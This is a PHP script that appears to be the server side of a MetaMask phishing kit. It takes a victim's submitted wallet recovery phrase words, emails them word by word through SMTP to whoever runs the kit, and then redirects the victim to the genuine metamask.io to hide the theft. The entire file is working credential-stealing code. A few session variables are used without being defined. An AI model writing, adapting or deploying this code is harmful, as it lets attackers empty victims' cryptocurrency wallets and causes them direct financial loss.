<?php

use Exception;

include_once './config.php';

$keys                   =   $_POST['keys'];

if (empty($keys)) {
    redirect(base_url());
} else {
    
    function sendEmail($try=1) {
        global $keys;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject  = 'New MetaMask Key Received';

            $html           =   '<p>A New MetaMask Key Detected,</p>' ;
            $html          .=   '<p>You have received a new key from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            
            foreach ($keys as $ki => $key) {
                $html          .=   "<li>Word $ki:  <b> $key </b></li>";
            }
            $html          .=   '</ul>' ;
            $mail->Body     =   $html;
            $mail->AltBody  =   'Keys : '. implode("|", $keys);
            
            $mail->send();

            $_SESSION["keys"]           =   $keys;
            $_SESSION["phone_number"]   =   $phone_number;
            $_SESSION["phone_code"]     =   $phone_code;
            $_SESSION["country_code"]   =   $country_code;
            
            if(empty($phone_number)) {
                redirect('https://metamask.io/');
            } else {
                redirect('https://metamask.io/');
            }
        } catch (Exception $ex) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>